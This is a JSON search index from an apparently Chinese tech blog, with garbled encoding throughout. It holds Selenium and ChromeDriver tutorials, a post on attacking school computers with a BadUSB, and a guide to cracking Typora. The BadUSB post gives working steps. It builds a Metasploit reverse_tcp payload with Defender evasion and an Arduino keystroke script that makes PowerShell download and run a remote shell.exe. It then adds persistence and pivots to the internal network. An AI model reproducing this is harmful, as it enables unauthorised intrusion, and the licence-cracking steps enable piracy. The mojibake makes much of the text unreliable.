å¦‚æœæ‰§è¡Œå°±ç»§ç»­ä¸‹ä¸€æ­¥ï¼Œæ²¡æœ‰æ‰§è¡Œå°±ç­‰å¾…30ç§’ï¼Œ30ç§’å¦‚æœå…ƒç´ è¿˜æœªå‡ºç°åˆ™æŠ›å‡ºå¼‚å¸¸ï¼Œä¸ç»§ç»­ demo: python\rresult=WebDriverWait(driver,10).until(expected_conditions.alert_is_present()) alert_is_present() #åˆ¤æ–­é¡µé¢æ˜¯å¦å‡ºç°alertæ¡† title_is() #åˆ¤æ–­é¡µé¢titleå†…å®¹æ˜¯ä¸ä¼ å…¥çš„title_textå†…å®¹å®Œå…¨åŒ¹é… title_contains() #åˆ¤æ–­é¡µé¢titleæ ‡ç­¾çš„å†…å®¹åŒ…å« partial_title() #åªéœ€è¦éƒ¨åˆ†åŒ¹é…å³å¯ text_to_be_present_in_element_value() #åˆ¤æ–­textæ˜¯å¦å‡ºç°åœ¨å…ƒç´ çš„valueå±æ€§å€¼ä¸­ text_to_be_present_in_element() #åˆ¤æ–­æ–‡æœ¬å†…å®¹testæ˜¯å¦å‡ºç°åœ¨æŸä¸ªå…ƒç´ ä¸­ï¼Œåˆ¤æ–­çš„æ˜¯å…ƒç´ çš„text presence_of_all_elements_located(*locator*)#åˆ¤æ–­é¡µé¢è‡³å°‘æœ‰ä¸€ä¸ªå¦‚æœå…ƒç´ å‡ºç°ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œè¿”å›æ‰€æœ‰æ»¡è¶³å®šä½è¡¨è¾¾å¼çš„é¡µé¢å…ƒç´  æŠ€å·§ ä¸ç­‰å¾…æŸä¸ªå…ƒç´ åŠ è½½ï¼Œä½¿ç”¨time.sleepæ–¹æ³•ï¼Œæ–¹ä¾¿å¿«æ·ã€‚ é”®ç›˜æ“ä½œ ç¬¬ä¸€ç§æ–¹æ³•â€”â€”Seleniumè‡ªå¸¦çš„KeysåŒ… from selenium.webdriver.common.keys import Keys å¸¸è§çš„é”®ç›˜æ“ä½œï¼š # åˆ é™¤é”® sent_keys(Keys.BACK_SPACE) # ç©ºæ ¼é”® sent_keys(Keys.SPACE) # tab é”® sent_keys(Keys.TAB) # delete é”® sent_keys(Keys.DELETE) # + é”® sent_keys(Keys.ADD) # enter é”® sent_keys(Keys.ENTER) # shift é”® sent_keys(Keys.SHIFT) # ctrl+Aï¼šå…¨é€‰ sent_keys(Keys.CONTROL, 'a') # ctrl+Cï¼šå¤åˆ¶ sent_keys(Keys.CONTROL, 'c') # ctrl+Vï¼šç²˜è´´ sent_keys(Keys.CONTROL, 'v') # ctrl+Xï¼šå‰ªåˆ‡ sent_keys(Keys.CONTROL, 'x') # F1 é”® sent_keys(Keys.F1) # æ•°å­—9 é”® sent_keys(Keys.NUMPAD9) ç¬¬äºŒç§æ–¹æ³•â€”â€”Pythonçš„ç¬¬ä¸‰æ–¹åº“â€”â€”pywin32åº“ import win32api import win32con class KeyboardKeys(object): #æ¨¡æ‹Ÿé”®ç›˜æŒ‰é”®ç±» VK_CODE={ 'enter':0x0D, 'ctrl':0x11, 'v':0x56 } @staticmethod def keyDown(keyName): #æŒ‰ä¸‹æŒ‰é”® win32api.keybd_event(KeyboardKeys.VK_CODE[keyName],0,0,0) @staticmethod def keyUp(keyName): #é‡Šæ”¾æŒ‰é”® win32api.keybd_event(KeyboardKeys.VK_CODE[keyName],0,win32con.KEYEVENTF_KEYUP,0) @staticmethod def oneKey(key): #æ¨¡æ‹Ÿå•ä¸ªæŒ‰é”® KeyboardKeys.keyDown(key) KeyboardKeys.keyUp(key) @staticmethod def twoKeys(key1,key2): #æ¨¡æ‹Ÿä¸¤ä¸ªç»„åˆé”® KeyboardKeys.keyDown(key1) KeyboardKeys.keyDown(key2) KeyboardKeys.keyUp(key2) KeyboardKeys.keyUp(key1) é—®é¢˜ Keybd_event() å…±æœ‰å››ä¸ªå‚æ•°ï¼š ç¬¬ä¸€ä¸ªä¸ºæŒ‰é”®çš„è™šæ‹Ÿé”®å€¼ï¼Œå¦‚å›è½¦é”®ä¸ºvk_returnï¼Œtabé”®ä¸ºvk_tabï¼› ç¬¬äºŒä¸ªå‚æ•°ä¸ºæ‰«æç ï¼Œä¸€èˆ¬ä¸ç”¨è®¾ç½®ï¼Œç”¨0ä»£æ›¿å°±è¡Œï¼› ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºé€‰é¡¹æ ‡å¿—ï¼Œå¦‚æœä¸ºkeydownåˆ™ç½®0å³å¯ï¼Œå¦‚æœä¸ºkeyupåˆ™è®¾æˆ\"KEYEVENTF_KEYUP\"ï¼› ç¬¬å››ä¸ªå‚æ•°ä¸€èˆ¬ä¹Ÿæ˜¯ç½®0å³å¯ã€‚ é¼ æ ‡æ“ä½œ from selenium.webdriver.common.action_chains import ActionChains å…¨å±€é¼ æ ‡æ“ä½œè¯­æ³•å¦‚ä¸‹ï¼š 1.åˆå§‹åŒ–ActionChiansç±»ï¼ˆåŠ¨ä½œé“¾æ¡ï¼‰ï¼š actions = ActionChains(driver) 2.æ‰¾åˆ°è¦æ“ä½œçš„å…ƒç´ ï¼š element = find_element (å€¼)3.è°ƒç”¨é¼ æ ‡æ“ä½œæ–¹æ³•ï¼š actions.move_to_element(element) 4.æ‰§è¡Œé¼ æ ‡æ“ä½œæ–¹æ³•ï¼š actions.perform()è°ƒç”¨ perform() æ–¹æ³•æ—¶ï¼Œé˜Ÿåˆ—ä¸­çš„æ“ä½œä¼šä¾æ¬¡è¿›è¡Œã€‚ å¸¸ç”¨æ–¹æ³• double_click(on_element=None) #åŒå‡»é¼ æ ‡å·¦é”® #å¸¸ç”¨äºæ‹–æ‹½éªŒè¯ç ç¯èŠ‚ï¼Œä¸åŒ…æ‹¬å›¾åƒè¡¥å…¨éªŒè¯ç ã€‚ source = driver.find_element_by_id(xxx) target = driver.find_element_by_id(xxx) drag_and_drop(source, target) action.drag_and_drop(source, target).perform() #æ‹–æ‹½å…ƒç´  move_by_offset(xoffset, yoffset) #é¼ æ ‡ä»1ä½ç½®ç§»åŠ¨åˆ°2åæ ‡ release(on_element=None) #åœ¨å…ƒç´ ä¸Šé‡Šæ”¾æŒ‰ä½çš„é¼ æ ‡æŒ‰é’®ï¼ˆåœ¨æŸä¸ªå…ƒç´ ä½ç½®æ¾å¼€é¼ æ ‡å·¦é”®ï¼‰ æ³¨æ„ æœ€ç»ˆè°ƒç”¨ perform() æ–¹æ³•æ—¶ï¼Œé˜Ÿåˆ—ä¸­çš„æ“ä½œæ‰ä¼šä¾æ¬¡è¿›è¡Œã€‚ ","date":"2023-06-04","objectID":"/posts/chromedriver%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/:0:0","tags":["å·¥å…·","Python","Selenium"],"title":"Seleniumâ€”â€”è¿›é˜¶ä½¿ç”¨","uri":"/posts/chromedriver%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/"},{"categories":["è‡ªåŠ¨åŒ–æµ‹è¯•","Python"],"content":"å®‰è£…ä¾¿æ·ã€å¯¹åº”ç‰ˆæœ¬ã€å®‰è£…å»ºè®®ã€ä¸åŒç³»ç»Ÿä¸‹çš„å®‰è£…æ–¹æ³•","date":"2023-06-03","objectID":"/posts/chromedriver%E5%AE%89%E8%A3%85/","tags":["å·¥å…·","Python","Selenium"],"title":"Seleniumâ€”â€”ChromeDriverå®‰è£…","uri":"/posts/chromedriver%E5%AE%89%E8%A3%85/"},{"categories":["è‡ªåŠ¨åŒ–æµ‹è¯•","Python"],"content":" æ‘˜è¦ â€œSeleniumæ”¯æŒå¸‚åœºä¸Šæ‰€æœ‰ä¸»è¦æµè§ˆå™¨,å¦‚Chromeã€Firefoxã€IEï¼ˆ7, 8, 9, 10, 11ï¼‰ã€Edgeã€Operaå’ŒSafariï¼Œä¸‹é¢ä»¥ä¸»æµçš„Chromeæµè§ˆå™¨è¿›è¡Œå®‰è£…æµ‹è¯•ã€‚ å®‰è£…Selenium pip install selenium å®‰è£…ChromeDriver è°·æ­Œé•œåƒ http://chromedriver.storage.googleapis.com/index.html æ·˜å®é•œåƒ https://npm.taobao.org/mirrors/chromedriver/ æ ¹æ®è‡ªå·±Chromeæµè§ˆå™¨ç‰ˆæœ¬ä¸‹è½½ å»ºè®®ä½¿ç”¨é«˜ç‰ˆæœ¬ï¼Œä½ç‰ˆæœ¬æœ‰äº›åŠŸèƒ½ä½¿ç”¨æœ‰BUG æ·»åŠ ç¯å¢ƒå˜é‡ å°†å®‰è£…å¥½çš„ChromeDriverç›®å½•æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ å¦‚æœæ²¡æœ‰é…ç½®,åˆ™åœ¨ä½ çš„Pythonä»£ç ä¸­å†™å‡ºï¼š from selenium import webdriver options = webdriver.ChromeOptions() driver = webdriver.Chrome(executable_path=\"ä½ çš„ChromeDriverçš„ç»å¯¹è·¯å¾„\", options=options) driver.get(\"https://www.baidu.com/\") driver.close() ç®€ä¾¿è®¾ç½® åœ¨Chromeå¿«æ·æ–¹å¼æ ‡ç­¾ä¸‹ï¼Œç›®æ ‡åé¢åŠ ä¸Šå‚æ•°ï¼Œåœ¨ç›®æ ‡ååŠ å…¥cmdå½“ä¸­çš„å‚æ•°ï¼Œèµ·å§‹ä½ç½®ä¸ºè‡ªå·±çš„é¡¹ç›®è·¯å¾„ï¼Œè¿™æ ·æ–¹ä¾¿ç®¡ç†å„ä¸ªæµ‹è¯•é¡¹ç›®ã€ç«¯å£ï¼Œç›®å½•è‹±æ–‡åå³ä¸ºé¡¹ç›®åã€‚ â€“remote-debugging-port=9222 --user-data-dir=\"./è‡ªå®šä¹‰ç©ºç›®å½•ï¼ˆè‹±æ–‡ï¼‰\" ä½¿ç”¨cmdï¼Œè¿è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå³å¯æŸ¥çœ‹è¿è¡ŒçŠ¶æ€ã€‚ netstat -ano | findstr 9222 æŠ€å·§ è¿è¡Œä»£ç åï¼Œå†æ‰‹åŠ¨æ‰“å¼€æµè§ˆå™¨ï¼Œå®ç°è°ƒè¯•ç›®çš„ï¼Œä¸ä¹±é¡ºåºã€‚ ä¸€äº›é”™è¯¯è§£å†³ å¦‚é‡åˆ°ç‰ˆæœ¬ä¸åŒ¹é…ç­‰é—®é¢˜ï¼Œè¿è¡Œä¸‹é¢ä»£ç ï¼š from win32com.client import Dispatch import re import stat,zipfile,os,psutil import requests from lxml import etree import time class auto_download_chromedrive(object): def __init__(self): self.chromedrive_url = \"https://chromedriver.chromium.org/downloads\" self.local_chrome_paths = [r\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\", r\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\"] self.headers = {'content-type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'} def get_version_via_com(self, filename): parser = Dispatch(\"Scripting.FileSystemObject\") try: version = parser.GetFileVersion(filename) except Exception: return None return version def get_chromedriver_urls(self): try: r = requests.Session() response = r.get(self.chromedrive_url, headers=self.headers) print(response.status_code, response.encoding) html = etree.HTML(response.text, etree.HTMLParser()) # è§£æHTMLæ–‡æœ¬å†…å®¹ version_href = html.xpath(\".//strong//..//@href\") print(\"all chrome browser versions can be choosed:\") for href in version_href: print(href) return version_href except Exception: return None def download_chromadrive(self, url): try: r = requests.Session() response = r.get(url, headers=self.headers) if response.status_code == 200: with open(\"chromedriver_win32.zip\", \"wb\") as f: f.write(response.content) print(\"ä¸‹è½½å®Œæˆ\") return 1 else: print('Urlè¯·æ±‚è¿”å›é”™è¯¯ï¼Œé”™è¯¯ç ä¸ºï¼š %d' % response.status_code) return None except Exception: print(\"request download chromedriver_win32.zip failed!\") return None def find_local_version(self, loc_ver, all_ver): \"\"\" :param loc_ver: æœ¬åœ°æµè§ˆå™¨çš„ç‰ˆæœ¬ :param all_ver: ä¸‹è½½çš„æ‰€æœ‰ç‰ˆæœ¬æµè§ˆå™¨ç‰ˆæœ¬ :return: æ‰¾åˆ°åŒ¹é…çš„ï¼Œreturn url,å¦åˆ™return None \"\"\" for href in all_ver: try: res = re.search(r\"path=(.*?)/\", href) find_ver = res.group(1).split(\".\")[0] #æˆªå–å¤§ç‰ˆæœ¬ if loc_ver == find_ver: return href except Exception: continue print(\"not find match chrome browser{} version!\".format(loc_ver)) return None def kill_process(self, process_name): print(\"æ£€æµ‹{}è¿›ç¨‹æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨åˆ™æ€æ‰ã€‚\".format(process_name)) pl = psutil.pids() for pid in pl: if psutil.Process(pid).name() == process_name: print('{} å­˜åœ¨è¿›ç¨‹ä¸­,æ€æ‰'.format(process_name)) os.popen('taskkill /f /im %s' %process_name) return pid print('{} ä¸å­˜åœ¨è¿›ç¨‹ä¸­ã€‚'.format(process_name)) return None def unzip(self): self.kill_process(\"chromedriver.exe\") print(\"å»é™¤æ—§ç‰ˆæœ¬chromedriver_win32æ–‡ä»¶å¤¹å†…æ–‡ä»¶çš„åªè¯»å±æ€§(å¦‚æœæ˜¯åªè¯»)\") old_driver_path = os.path.join(os.getcwd(), \"chromedriver_win32\") if os.path.exists(old_driver_path): for sub_file in os.listdir(old_driver_path): os.chmod(os.path.join(old_driver_path, sub_file), stat.S_IRWXU) time.sleep(1) #è¿™ä¸ªdelayå¿…é¡»è¦æœ‰ï¼Œosæ“ä½œè¿˜æ˜¯éœ€è¦æ—¶é—´çš„ print('''è§£å‹ chromedriver_win32.zip,è¦†ç›–æ—§ç‰ˆæœ¬''') zFile = zipfile.ZipFile(os.path.join(os.getcwd(), \"chromedriver_win32.zip\"), \"r\") for fileM in zFile.namelist(): zFile.extract(fileM, old_driver_path) zFile.close() def start(self): '''è¯»å–æœ¬åœ°chrome version''' version = list(filter(None, [self.get_version_via_com(p) for p in self.local_chrome_paths]))[0] if not version: print(\"check chrome browser version failed!\") return None print(\"chrome browser version:\", version) '''ä¸‹è½½ç½‘é¡µç«¯ä¸æœ¬åœ°åŒ¹é…çš„chromedriver.exe''' version_href = self.get_chromedriver_urls() if not version_hre","date":"2023-06-03","objectID":"/posts/chromedriver%E5%AE%89%E8%A3%85/:0:0","tags":["å·¥å…·","Python","Selenium"],"title":"Seleniumâ€”â€”ChromeDriverå®‰è£…","uri":"/posts/chromedriver%E5%AE%89%E8%A3%85/"},{"categories":["è¿‘æºæ¸—é€"],"content":"æœ¬æ–‡æ‰€ç”¨åˆ°çš„å·¥å…·ï¼š l Badusb l Ngrok l Arduino l Msfconsole l Msfvenom l è¿·ä½ ç›¸æœº è“„è°‹å·²ä¹…çš„å‰è¨€ï¼š æ¯æ¬¡ä¸Šæ¥¼æ—¶ï¼Œéƒ½èƒ½çœ‹è§å¹¿æ’­å®¤é—¨å¼€å¾—éå¸¸å®½ï¼Œ ä½†è¿™ä¸æ˜¯é‡ç‚¹ï¼Œé‡ç‚¹æ˜¯é‡Œé¢çš„ç”µè„‘ï¼ˆWindows XPï¼‰ï¼Œç”µè„‘æ¡Œé¢ä¸Šæ˜¯LEDå¤§å±å¹•çš„ç¼–è¾‘è½¯ä»¶ã€‚ äºŒæ¥¼æœ‰ä¸ªç½‘ç»œç®¡ç†ç®±å¹¶ç”±ç®¡é“å†…çš„ç½‘çº¿ä¼ è¾“åˆ°æ¯ä¸ªæ•™å®¤çš„å¤šåª’ä½“ï¼ˆWindows 10ï¼‰ã€‚ çœ‹çœ‹å…œé‡Œçš„Badusbï¼Œçªç„¶å°±æ•£å‘å‡ºäº†æµ“æµ“çš„é¦™å‘³ï¼Œå“§æºœã€‚ ä¿—è¯è¯´â€œè‰ºé«˜äººèƒ†å¤§â€ï¼Œä½†å¾ä¹Ÿè¦ï¼šæ­¦è‰ºä¸é«˜å¼ºï¼Œèœé¸Ÿä¹Ÿå…ˆé£ï¼ åˆ†æå¹¶æ•´ç†æ”¶é›†åˆ°çš„ä¿¡æ¯ ä¸»æœº ç³»ç»Ÿ æ€æ¯’è½¯ä»¶ ç½‘ç»œçŠ¶æ€ å¹¿æ’­å®¤ Windows XP ä¸è¯¦ ä¸è¯¦ å¤šåª’ä½“ Windows 10 Defender**ã€360 æ­£å¸¸ è€Œä¸”æˆ‘ä»¬ä»äºŒæ¥¼çš„ç½‘ç»œç®¡ç†ç®±åˆ†æ”¯ç½‘çº¿çš„ç®¡é“å¯æ¨æ–­å‡ºäºŒæ¥¼æ‰€æœ‰æ•™å¸ˆçš„å¤šåª’ä½“å±äºåŒä¸€å†…ç½‘ã€‚æˆ‘ä»¬åœ¨çƒ§å½•ä»£ç çš„æ—¶å€™ï¼Œå°±è¦æ ¹æ®ä¸åŒçš„ç³»ç»Ÿç‰ˆæœ¬ï¼Œç½‘ç»œçŠ¶æ€ï¼Œæ€æ¯’è½¯ä»¶ç­‰å› ç´ æ¥è¿›è¡Œçƒ§å½•ã€‚ä¸ºä»€ä¹ˆè¯´å¹¿æ’­å®¤çš„å…·ä½“ä¿¡æ¯æˆ‘ä»¬è·å–ä¸åˆ°å‘¢ï¼Ÿå› ä¸ºâ€œå¯è¿œè§‚ï¼Œè€Œä¸å¯äºµç©ç„‰ã€‚â€ éƒ¨ç½²PayloadåŠè§„é¿æ¨¡å—åˆ°Ngrok é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨è§„é¿æ¨¡å—ç”Ÿæˆä¸€ä¸ªWindows EXEæ–‡ä»¶æ¥è§„é¿Windwos Defenderç¨‹åºï¼Œæ“ä½œå¦‚ä¸‹ï¼š show evasuibd use windows/windows_defender_exe show options æ¥ç€run å¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„FILE NAMEï¼ˆæ–‡ä»¶åæ˜¯éšæœºçš„ï¼‰ å½“ç„¶ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ Set FILENAME æ–‡ä»¶åå³å¯ ç”Ÿæˆçš„æ–‡ä»¶ä¿å­˜åˆ°äº† /root/.msf4/local/yZdsypg.exeæ¥ä¸‹æ¥æˆ‘ä»¬æ¥éƒ¨ç½²åå¼¹ç¯å¢ƒ åœ¨è¿™é‡Œæ¥æ³¨å†Œä¸€ä¸ªè´¦æˆ· ç™»å½•åæ¥åˆ°åå°é¡µé¢ç‚¹å‡» å½“ç„¶ä¹Ÿæœ‰å…è´¹çš„éš§é“ï¼Œä¸è¿‡ç½‘é€Ÿè¾ƒæ…¢ï¼Œæ ¹æ®è‡ªå·±çš„æƒ…å†µè€Œå®šï¼ æ¥ç€æˆ‘ä»¬ç‚¹å‡»ç«‹å³è´­ä¹°ï¼Œä¼šè·³è½¬åˆ°éš§é“é…ç½®çš„é¡µé¢ï¼Œå¦‚å›¾ï¼š ä½¿ç”¨pingæœåŠ¡å™¨åœ°å€å‘½ä»¤ï¼Œæ‰¾åˆ°IPåœ°å€ã€‚ æ¥ç€æˆ‘ä»¬æ‰“å¼€åˆšè§£å‹ä¸‹æ¥çš„æ–‡ä»¶å¤¹ è¾“å…¥./sunny clientid å¡«å†™ä½ çš„éš§é“ID å‡ºç°è¿™ä¸ªç•Œé¢å°±ä»£è¡¨éš§é“è¿æ¥æˆåŠŸï¼ æ¥ç€æˆ‘ä»¬ç”¨Msfvenomç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶,ä»£ç å¦‚ä¸‹ï¼š msfvenom -p windows/meterpreter/reverse_tcp LHOST=å¹³å°ç»™å‡ºçš„IP LPORT=å¹³å°ç»™å‡ºçš„ç«¯å£ -e x86/shikata_ga_nai -b \"\\x00\" -i 5 -a x86 --platform win PrendMigrate=true PrendMigrateProc=svchost.exe -f exe -o /root/shell.exe æ³¨ï¼šå¦‚æœæ˜¯64ä½ç³»ç»Ÿï¼ŒPayloadåˆ™æ›´æ”¹ä¸ºï¼šwindows/x64/meterpreter/reverse_tcpå¯¹äºå°ç™½å¾ˆé™Œç”Ÿå¸¦ä¸¤ä¸ªå€¼æ˜¯å¯ä»¥å®ç°è‡ªåŠ¨è¿ç§»è¿›ç¨‹çš„åŠŸèƒ½ï¼Œå…³é—­å…¶ä¸­ä¸€è¿›ç¨‹å¹¶ä¸å½±å“å¦ä¸€è¿›ç¨‹ã€‚ -ké€‰é¡¹å¹¶ä¸é€‚ç”¨äºæ‰€æœ‰æ¨¡æ¿ï¼Œè¯·æå‰åšå¥½æµ‹è¯•ã€‚ å®‰è£…Arduino é¦–å…ˆæˆ‘ä»¬æ‰“å¼€arduinoå®‰è£…åŒ… å®Œæˆäº†å®‰è£…ã€‚ é…ç½®å¦‚ä¸‹ï¼š å®Œæˆå®‰è£…ã€‚ çƒ§å½•ä»£ç  ä»£ç è´´å‡ºï¼š #include \u003cKeyboard.h\u003e void setup() {//åˆå§‹åŒ– Keyboard.begin();//å¼€å§‹é”®ç›˜é€šè®¯ delay(5000);//å»¶æ—¶ Keyboard.press(KEY_LEFT_GUI);//winé”® delay(500); Keyboard.press('r');//ré”® delay(500); Keyboard.release(KEY_LEFT_GUI); Keyboard.release('r'); delay(500); Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK); Keyboard.println(\"CMD.EXE /t:01 /k MODE con: cols=16 lines=2\"); delay(1000); Keyboard.println(\"POWERSHELL -cOMMAND $CLNT = NEW-OBJECT sYSTEM.nET.wEBcLIENT;$URL= 'http://ip/shell.exe';$FILE = ' c:\\\\SHELL.EXE ';$CLNT.dOWNLOADfILE($URL,$FILE);\"); delay(3000); Keyboard.println(\"C:\\\\SHELL.EXE\u0026EXIT\"); Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK); Keyboard.end();//ç»“æŸé”®ç›˜é€šè®¯ } void loop()//å¾ªç¯ { } æ›´å¤šä»£ç åœ¨æ–‡ç« åº•éƒ¨æœ‰ç›¸å…³ä¿¡æ¯ï¼Œä¸è¦ç€æ€¥ï¼ ç¼–è¯‘å¥½ä¹‹åæˆ‘ä»¬ç›´æ¥ä¸Šä¼ å³å¯å®Œæˆçƒ§å½•ï¼Œç›´æ¥ç‚¹å‡»ä¸Šä¼ å¯ä»¥æ£€æŸ¥ç¼–è¯‘å¹¶ä¸Šä¼ ã€‚ Shellå¿«åˆ°ç¢—é‡Œæ¥ è®©åŸºå‹ç»™æˆ‘èµ¶çƒ§ï¼š å¦‚å›¾ï¼š æˆ‘ä»¬å·²ç»è·å–åˆ°äº†Meterpreterä¼šè¯ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº†ï¼ ä¸ºäº†é˜²æ­¢äº¡ç¾Šè¡¥ç‰¢ï¼Œè¦ä¸€åŠ³æ°¸é€¸ï¼Œæˆ‘ä»¬å…ˆæ·»åŠ ä¸€ä¸ªæŒä¹…åé—¨ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š run persistence -X -i 5 -p ç«¯å£ -r IP æˆ–è€… run metsvc ç¬¬äºŒç§æ–¹æ³•ç›´æ¥ç›‘å¬å³å¯ï¼Œå…·ä½“æ–¹æ³•æ‰¾è°·å“¥å’Œåº¦å¨˜ã€‚ é™„å¸¦ä¸€å¼ å±å¹•æˆªå›¾ï¼š screenshot æ‰“å¼€å·çª¥ä¸€ä¸‹ï¼š å†…ç½‘æ¼«æ¸¸ æŸ¥çœ‹å­ç½‘ï¼š æŸ¥çœ‹å­ç½‘ï¼š run get_local_subnets æ·»åŠ è·¯ç”±ï¼š route add å­ç½‘ æ©ç  ä¼šè¯id æŸ¥çœ‹è·¯ç”±ï¼š route print è‡ªåŠ¨åŒ–æ·»åŠ è·¯ç”±ï¼š load auto_add_route é¢â€¦â€¦.å¥½å§ å¾—é€€å‡ºmeterpreterä¼šè¯ï¼Œå› ä¸å¯æè¿°å› ç´ ï¼Œå°±è¿™æ ·å§ã€‚ æç¤ºå¾—è¿è¡Œä¸€ä¸ªPostæ¨¡å—ï¼Œå¹¶ä¸”æ·»åŠ å‚æ•°ï¼Œå¤§å®¶æ˜ç™½å°±å¥½ã€‚ è®¾ç½®å®Œæ¯•åæ¥ä¸‹æ¥å°±çœ‹è‡ªå·±çš„æ“ä½œäº†ï¼Œ å¹¿æ’­å®¤ä¹Ÿè¢«æå®šï¼Œä¹Ÿæ˜¯å› ä¸å¯æè¿°è§„ç« åˆ¶åº¦ç­‰åŸå› ä¸å†ç»§ç»­ã€‚ æ­£æ–‡åˆ°æ­¤ç»“æŸã€‚ æ€»ç»“ 1.è¦æå‰çŸ¥æ™“æ“ä½œç³»ç»Ÿã€‚ 2.æ ¹æ®ä¸åŒçš„ç³»ç»Ÿè¦æ„é€ ä¸åŒçš„Payloadã€‚ 3.é‡‡ç”¨å¤šç§å¯æ‰§è¡Œåç¼€ï¼ˆbatã€exeã€docxï¼‰ã€‚ 4.è·å–Shellè¦ç¬¬ä¸€æ—¶é—´æ·»åŠ åé—¨ã€‚ 5.ä¸æ¨èä½¿ç”¨Ngrokï¼Œè‡ªè¡Œç™¾åº¦å…¶ä»–å¹³å°ï¼Œä½†ä½¿ç”¨æ–¹æ³•åŸºæœ¬ä¸€è‡´ã€‚ 6.æ·»åŠ å®Œè·¯ç”±å¦‚æœæœ‰ç½‘ç»œå¼‚å¸¸çŠ¶æ€ï¼Œåˆ™åˆ é™¤è·¯ç”±æ¡ç›®ã€‚ ä»£ç ä»¥çƒ§å½•å™¨æ•´ç†é›†åˆå¦‚ä¸‹ï¼š (å‡æ¥è‡ªäº’è”ç½‘ã€é€‚ç”¨ä¸å¦è¯·æå‰åœ¨è™šæ‹Ÿæœºæµ‹è¯•) æ‰“å¼€çƒ§å½•è„šæœ¬è½¯ä»¶ï¼Œç‚¹å‡»æ–‡ä»¶â€“æ‰“å¼€å³å¯ã€‚ æå–ç ï¼šbtmz https://pan.baidu.com/s/17UCyKosBkjCRb7IBfxfdPg æ³¨ï¼šæœ¬æ–‡ä»…ä¾›å‚è€ƒï¼Œå†…å®¹ä»…ä¸ºè™šæ„ï¼Œä»£ç ä»¥åŠä½¿ç”¨æ–¹æ³•åˆ‡å‹¿ä½¿ç”¨äºéæ³•ç”¨é€”ï¼ åŸåˆ›æ–‡ç« -åŸæ–‡é“¾æ¥ ","date":"2023-05-27","objectID":"/posts/badusb/:0:0","tags":["ç‰©ç†ç¡¬ä»¶"],"title":"æºBadusbè¿›æ ¡å›­çš„ç³»åˆ—æµ‹è¯•","uri":"/posts/badusb/"},{"categories":["å·¥å…·ç ´è§£/ä½¿ç”¨"],"content":"æœ¬æ–‡ä»‹ç»ç ´è§£ç‰ˆçš„ä½¿ç”¨ã€ä¾¿æ·åŒ–çš„æ–¹æ³•ï¼ˆä¸ä¿®æ”¹ç³»ç»Ÿæ—¶é—´ä¸ç”¨ç®¡ç†å‘˜è¿è¡Œï¼‰","date":"2023-05-25","objectID":"/posts/typora%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8/","tags":["å·¥å…·"],"title":"Markdownç¼–è¾‘å™¨â€”â€”Typoraç ´è§£ç‰ˆ","uri":"/posts/typora%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8/"},{"categories":["å·¥å…·ç ´è§£/ä½¿ç”¨"],"content":" æ‘˜è¦ æœ¬æ–‡ä»‹ç»ç ´è§£ç‰ˆä½¿ç”¨ã€ä¾¿æ·åŒ–çš„æ–¹æ³• ï¼ˆä¸ä¿®æ”¹ç³»ç»Ÿæ—¶é—´ä¸ç”¨ç®¡ç†å‘˜è¿è¡Œï¼‰ è¿è¡Œå¹¶ä¸”ä¿®æ”¹RunAsDate.exeçš„å‚æ•° å‚æ•°ä¿®æ”¹å¦‚ä¸Šå›¾å³å¯ï¼ŒTypora(RunAsDate)ä¸ºä½ ç”Ÿæˆçš„ç ´è§£ç‰ˆè½¯ä»¶å æ³¨å†Œè¡¨ç¼–è¾‘ å°†file.icoã€RunAsDate.exeã€Typora.exeæ‰¾åˆ°å¹¶ä¸”ä¿®æ”¹ä¸ºä½ è‡ªå·±çš„è·¯å¾„æ³¨æ„ä¸ºåæ–œæ  Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\\Applications\\Typora-run.bat] [HKEY_CLASSES_ROOT\\Applications\\Typora-run.bat\\DefaultIcon] @=\"D:\\\\Typora\\\\resources\\\\assets\\\\file.ico\" [HKEY_CLASSES_ROOT\\Applications\\Typora-run.bat\\shell] [HKEY_CLASSES_ROOT\\Applications\\Typora-run.bat\\shell\\open] [HKEY_CLASSES_ROOT\\Applications\\Typora-run.bat\\shell\\open\\command] @=\"C:\\\\Users\\\\safex\\\\Downloads\\\\runasdate-x64\\\\RunAsDate.exe /movetime 13\\\\02\\\\2020 00:00:00 \\\" D:\\\\Typora\\\\Typora.exe\\\" \\\"%1\\\"\" [HKEY_CLASSES_ROOT\\Applications\\Typora-run.bat\\SupportedTypes] \".md\"=\"\" \".markdown\"=\"\" \".mdown\"=\"\" \".mkd\"=\"\" \".mmd\"=\"\" ä¿®æ”¹åå»è¿è¡ŒTypora-run.batã€Typora-run.reg è®¾ç½®ä¸­ä¿®æ”¹mdæ–‡ä»¶æ‰“å¼€æ–¹å¼ æˆåŠŸ æ‰“å¼€mdæ–‡ä»¶ï¼Œæ­£å¸¸å¯åŠ¨Typoraï¼Œåˆ™è¯´æ˜ç ´è§£æˆåŠŸï¼ å®‰è£…åŒ… https://wwme.lanzoum.com/i5Ot40xao6ze ","date":"2023-05-25","objectID":"/posts/typora%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8/:0:0","tags":["å·¥å…·"],"title":"Markdownç¼–è¾‘å™¨â€”â€”Typoraç ´è§£ç‰ˆ","uri":"/posts/typora%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8/"}]